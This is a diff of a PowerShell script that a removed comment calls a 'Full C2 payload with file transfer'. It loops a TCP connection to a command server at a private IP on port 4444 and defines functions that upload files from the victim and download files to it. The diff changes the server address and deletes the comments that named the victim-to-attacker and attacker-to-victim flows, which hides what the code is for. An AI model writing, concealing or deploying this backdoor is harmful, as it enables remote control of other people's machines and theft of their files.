@@ -1,5 +1,4 @@
-# Full C2 payload with file transfer
-$server = "192.168.150.4"
+$server = "192.168.150.2"
 $port = 4444
 
 while($true){
@@ -9,7 +8,6 @@ while($true){
         $writer = New-Object System.IO.StreamWriter($stream)
         $reader = New-Object System.IO.StreamReader($stream)
         
-        # File upload function (victim → attacker)
         function Get-File($path){
             if(Test-Path $path){
                 $bytes = [System.IO.File]::ReadAllBytes($path)
@@ -21,7 +19,6 @@ while($true){
             $writer.Flush()
         }
         
-        # File download function (attacker → victim)
         function Put-File($url, $dest){
             try{
                 $wc = New-Object System.Net.WebClient
